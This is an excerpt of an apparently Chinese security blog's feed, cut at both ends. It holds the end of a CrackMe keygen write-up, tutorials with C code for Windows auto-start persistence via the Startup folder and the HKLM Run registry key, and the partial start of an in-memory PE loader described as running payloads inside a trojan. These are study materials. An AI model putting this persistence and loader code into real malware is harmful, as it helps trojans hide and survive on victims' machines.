class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> length = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> num = length * <span class="hljs-number">0x17CFB</span>;<br>num += name[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">char</span>* s1 = <span class="hljs-string">&quot;AKA-&quot;</span>;<br><span class="hljs-keyword">char</span>* serial = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><span class="hljs-built_in">sprintf</span>(serial, <span class="hljs-string">&quot;%s%d&quot;</span>,s1,num);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用户名是%s\n注册码是%s\n&quot;</span>,name, serial);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行输入name:b1ackie，输出serial:AKA-682815。</p><p><img src="/2021/07/20/160CrackMe-002/4.png"></p><p>输入正确的name和serial后，弹出正确提示</p><p><img src="/2021/07/20/160CrackMe-002/5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序，看到提示输入name和serial，输入后，提示错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/20/160Crack</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>自启动技术-快速启动目录</title>
    <link href="https://b1ackie.cn/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/"/>
    <id>https://b1ackie.cn/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/</id>
    <published>2021-07-19T09:11:43.000Z</published>
    <updated>2021-08-09T10:53:21.574Z</updated>
    
    <content type="html"><![CDATA[<h4 id="快速启动目录"><a href="#快速启动目录" class="headerlink" title="快速启动目录"></a>快速启动目录</h4><p>Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。</p><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><h5 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h5><p>获取指定的系统路径</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BOOL </span><span class="hljs-keyword">SHGetSpecialFolderPath(</span><br><span class="hljs-keyword"></span>  HWND  hwndOwner,<br>  LPSTR lpszPath,<br>  int   nFolder,<br>  <span class="hljs-keyword">BOOL </span> fCreate<br>);<br></code></pre></div></td></tr></table></figure><p>hwndOwner：窗口所有者句柄</p><p>lpszPath：返回路径的缓冲区，该缓冲区带下至少为MAX_PATH</p><p>nFolder：系统路径的CSIDL标识。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>CSIDL_BITBUCKET</td><td>桌面\回收站</td></tr><tr><td>CSIDL_CONTROLS</td><td>我的电脑\控制面板</td></tr><tr><td>CSIDL_DESKTOP</td><td>桌面</td></tr><tr><td>CSIDL_DRIVES</td><td>我的电脑</td></tr><tr><td>CSIDL_STARTUP</td><td>开始菜单\程序\启动</td></tr><tr><td>CSIDL_SYSTEM</td><td>SYSTEM文件夹</td></tr><tr><td>CSIDL_WINDOWS</td><td>WINDOWS目录</td></tr></tbody></table><p>fCreate：指示文件夹不存在时是否要创建。为FALSE时则不创建，否则创建。</p><p>返回值：成功TRUE；失败FALSE。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>获取系统的快速启动目录，然后将需要自启的程序放入快速启动目录中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;shlobj.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">AutoRun</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszSrcFilePath, <span class="hljs-keyword">char</span>* lpszDestFileName)</span> </span>&#123;<br><span class="hljs-keyword">char</span> szStartUpPath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> szDestFilePath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">//获取快速启动目录</span><br><span class="hljs-keyword">if</span> (SHGetSpecialFolderPathA(<span class="hljs-literal">NULL</span>, szStartUpPath, CSIDL_STARTUP, TRUE) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取系统路径失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//将数据写入指定的缓冲区</span><br>wsprintfA(szDestFilePath, <span class="hljs-string">&quot;%s\\%s&quot;</span>, szStartUpPath, lpszDestFileName);<br><span class="hljs-comment">//将文件内容拷贝到缓冲区</span><br><span class="hljs-keyword">if</span> (CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;向快速启动目录写入失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (AutoRun(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, <span class="hljs-string">&quot;TestApc.exe&quot;</span>) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;成功\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在物理机中运行一下此程序，火绒马上提醒</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/1.png"></p><p>在虚拟机中运行此程序，提示成功，然后到快速启动目录中查看，即可看到自启程序</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/2.png"></p><p>使用火绒剑进行查看，可以看到在windows的快速启动目录下，有TestApc.exe程序。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;快速启动目录&quot;&gt;&lt;a href=&quot;#快速启动目录&quot; class=&quot;headerlink&quot; title=&quot;快速启动目录&quot;&gt;&lt;/a&gt;快速启动目录&lt;/h4&gt;&lt;p&gt;Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。&lt;/p&gt;
&lt;h4 id=&quot;函数</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="自启动技术" scheme="https://b1ackie.cn/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>自启动技术-注册表</title>
    <link href="https://b1ackie.cn/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    <id>https://b1ackie.cn/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/</id>
    <published>2021-07-19T06:13:39.000Z</published>
    <updated>2021-08-11T08:43:32.660Z</updated>
    
    <content type="html"><![CDATA[<h4 id="注册表方式实现自启动"><a href="#注册表方式实现自启动" class="headerlink" title="注册表方式实现自启动"></a>注册表方式实现自启动</h4><p>实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="RegOpenKeyEx"><a href="#RegOpenKeyEx" class="headerlink" title="RegOpenKeyEx"></a>RegOpenKeyEx</h5><p>打开一个指定的注册表键</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">LSTATUS <span class="hljs-title">RegOpenKeyExA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HKEY   hKey,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpSubKey,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  ulOptions,</span></span><br><span class="hljs-params"><span class="hljs-function">  REGSAM samDesired,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHKEY  phkResult</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hKey：打开注册表项的句柄。该句柄由RegCreateKeyEx或RegOpenKeyEx函数返回，或者它可以是以下预定义键之一：</p><ul><li>HKEY_CLASSES_ROOT</li><li>HKEY_CURRENT_CONFIG </li><li>HKEY_CURRENT_USER</li><li>HKEY_LOCAL_MACHINE</li><li>HKEY_USERS</li></ul><p>lpSubKey：将打开的注册表子项的名称</p><p>ulOptions：保留，必须设置为0</p><p>samDesired：对指定键希望得到的访问权限进行的访问标记。这个参数可以是下列值得组合</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>KEY_CREATE_LINK</td><td>准许生成符号键</td></tr><tr><td>KET_CREATE_SUB_KEY</td><td>准许生成子键</td></tr><tr><td>KEY_ENUMERATE_SUB_KEYS</td><td>准许生成枚举子键</td></tr><tr><td>KEY_EXECUTE</td><td>准许进行读操作</td></tr><tr><td>KEY_NOTIFY</td><td>准许更换通告</td></tr><tr><td>KEY_QUERY_VALUE</td><td>准许查询子键</td></tr><tr><td>KEY_ALL_ACESS</td><td>提供完全访问，它是上面数值的组合</td></tr><tr><td>KEY_READ</td><td>是KEY_QUERY_VALUE,KEY_ENUMERATE_SUB_KEYS,KEY_NOTIFY的组合</td></tr><tr><td>KEY_SET_VALUE</td><td>准许设置子键的数值</td></tr><tr><td>KEY_WRITE</td><td>是KEY_SET_VALUE、KET_CREATE_SUB_KEY的组合</td></tr><tr><td>KEY_WOW64_32KEY</td><td>表示64位系统中的应用程序应该在32位注册表试图上运行。32位系统会忽略该标志。</td></tr><tr><td>KEY_WOW64_64KEY</td><td>表示64位系统的应用程序应该在64位注册表试图上运行。32位系统上忽略该标志。</td></tr></tbody></table><p>phkResult：指向一个变量的指针，该变量保存打开注册表键的句柄。如果不再使用返回的句柄，则调用RegClose来关闭它。</p><p>返回值：如果成功，返回0；失败返回一个非零的错误代码。</p><h5 id="RegSetValueEx函数"><a href="#RegSetValueEx函数" class="headerlink" title="RegSetValueEx函数"></a>RegSetValueEx函数</h5><p>在注册表项下设置指定值得数据和类型</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">LSTATUS RegSetValueExA(<br>  HKEY       hKey,<br>  LPCSTR     lpValueName,<br>  <span class="hljs-built_in">DWORD</span>      Reserved,<br>  <span class="hljs-built_in">DWORD</span>      dwType,<br>  const <span class="hljs-built_in">BYTE</span> *lpData,<br>  <span class="hljs-built_in">DWORD</span>      cbData<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hKey：指定一个已打开项的句柄，或一个标准项名。</p><p>lpValueName：指向一个字符串的指针，该字符串包含了与设置值的名称。若拥有该名称的值并不存在于指定的注册表中，则此函数会将其加入到该项。如果此值是NULL或指向空字符串，则此函数将会设置该项的默认值或未命名值得类型和数据。</p><p>Reserved：保留值，必须为0；</p><p>dwType：指定将存储的数据类型，该参数可以为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>REG_BINARY</td><td>任何形式的二进制数据</td></tr><tr><td>REG_DWORD</td><td>一个32位的数字</td></tr><tr><td>REG_DWORD_LITTLE_ENDIAN</td><td>一个格式为“低字节在前”的32位数字</td></tr><tr><td>REG_DWORD_BIG_ENDIAN</td><td>一个格式为“高字节在前”的32位数字</td></tr><tr><td>REG_EXPAND_SZ</td><td>一个以0结尾的字符串，该字符串包含环境变量（如“%PATH”）</td></tr><tr><td>REG_LINK</td><td>一个Unicode格式的带符号链接</td></tr><tr><td>REG_MULTI_SZ</td><td>一个以0结尾的字符串数组，该数组以链接两个0作为终止符</td></tr><tr><td>REG_ONE</td><td>未定义值类型</td></tr><tr><td>REG_RESOURCE_LIST</td><td>一个设备驱动器资源列表</td></tr><tr><td>REG_SZ</td><td>一个以0结尾的字符串</td></tr></tbody></table><p>lpData：指向一个缓冲区，该缓冲区包含了为指定值名称存储的数据。</p><p>cbData：指定由lpData参数所指向的数据大小，单位是字节。</p><p>返回值：返回0表示陈成功；返回其他任何值都代表一个错误代码。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>对于Windows来说，提供了专门的开机自启动注册表，每次开机时，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以要想实现注册表开机自启动，只需要在这个注册表键下添加想要设置自启动的程序路径就可以了。</p><p>这里用最常见的RUN键来进行设置，该键位置是[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]和[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><p>代码实现在HKEY_LOCAL_MACHINE下进行设置，这需要管理员运行权限。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">Register</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszFileName, <span class="hljs-keyword">char</span>* lpszValueName)</span> </span>&#123;<br>    HKEY hKey;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="hljs-number">0</span>, KEY_WRITE, &amp;hKey) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开注册表失败\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegSetValueEx</span>(hKey, lpszValueName, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)lpszFileName, (<span class="hljs-built_in">lstrlen</span>(lpszFileName) + <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;设置注册表值失败\n&quot;</span>);<br>        <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Register</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\Register.exe&quot;</span>, <span class="hljs-string">&quot;b1ackie&quot;</span>) == FALSE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;自启动失败\n&quot;</span>);<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;自启动成功\n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>打开程序，提示自启动成功，说明注册表设置成功。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/1.png"></p><p>用regedit命令查看注册表相关信息，可以成功看到当前的注册表信息，注意图中路径的不同，这是因为重定位的原因。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/2.png"></p><p>也可以使用火绒剑，如图可以看到启动项的信息，现在重启计算机，就会自动启动了。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;注册表方式实现自启动&quot;&gt;&lt;a href=&quot;#注册表方式实现自启动&quot; class=&quot;headerlink&quot; title=&quot;注册表方式实现自启动&quot;&gt;&lt;/a&gt;注册表方式实现自启动&lt;/h4&gt;&lt;p&gt;实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="自启动技术" scheme="https://b1ackie.cn/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>启动技术-内存直接加载运行</title>
    <link href="https://b1ackie.cn/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/"/>
    <id>https://b1ackie.cn/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/</id>
    <published>2021-07-15T06:28:21.000Z</published>
    <updated>2021-08-09T10:52:21.474Z</updated>
    
    <content type="html"><![CDATA[<h4 id="内存直接加载运行"><a href="#内存直接加载运行" class="headerlink" title="内存直接加载运行"></a>内存直接加载运行</h4><p>内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>打开文件并且获取大小</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span>* FileName = <span class="hljs-string">&quot;自己的文件路径&quot;</span>;<br><span class="hljs-comment">//打开文件</span><br>HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(FileName, GENERIC_READ | GENERIC_WRITE,<br>FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING,<br>FILE_ATTRIBUTE_ARCHIVE, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//获取大小</span><br>DWORD dwFileSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//申请内存空间</span><br>PBYTE pData = <span class="hljs-keyword">new</span> BYTE[dwFileSize];<br>DWORD dwRet = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//将文件读取到内存中</span><br><span class="hljs-built_in">ReadFile</span>(hFile, pData, dwFileSize, &amp;dwRet, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br></code></pre></div></td></tr></table></figure><h5 id="获取sizeofimage"><a href="#获取sizeofimage" class="headerlink" title="获取sizeofimage"></a>获取sizeofimage</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*获取PE文件的镜像大小，获取加载到内存后的大小</span><br><span class="hljs-comment">* lpData内存中的基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetImageSize</span><span class="hljs-params">(LPVOID lpData)</span> </span>&#123;<br>DWORD dwSizeOfImage = <span class="hljs-number">0</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage;<br><span class="hljs-keyword">return</span> dwSizeOfImage;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">LPVOID lpBaseAddr = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">RtlZeroMemory</span>(lpBaseAddr, dwImageSize);<br></code></pre></div></td></tr></table></figure><h5 id="重定位数据"><a href="#重定位数据" class="headerlink" title="重定位数据"></a>重定位数据</h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*获取重定位表的相关数据并且重定位数据</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoRelocationTable</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取重定位表</span><br>PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)pDosHeader +<br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br><span class="hljs-keyword">if</span> ((PVOID)pReloc == (PVOID)pDosHeader) &#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span 